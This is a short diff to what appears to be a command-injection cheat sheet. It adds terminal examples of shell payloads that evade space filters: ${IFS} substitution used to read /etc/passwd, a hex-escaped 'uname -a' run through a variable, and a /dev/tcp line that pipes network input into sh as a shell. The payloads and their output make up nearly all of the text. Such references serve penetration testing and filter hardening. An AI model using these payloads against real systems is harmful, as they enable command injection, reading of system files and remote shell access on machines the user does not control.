@@ -33,6 +33,11 @@ swissky@crashlab▸ ~ ▸ $ echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
 RCE
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+swissky@crashlab▸ ~ ▸ $ X=$'uname\x20-a'&&$X
+Linux crashlab 4.4.X-XX-generic #72-Ubuntu
+
+swissky@crashlab▸ ~ ▸ $ sh</dev/tcp/127.0.0.1/4242
 ```
 
 NodeJS Code execution
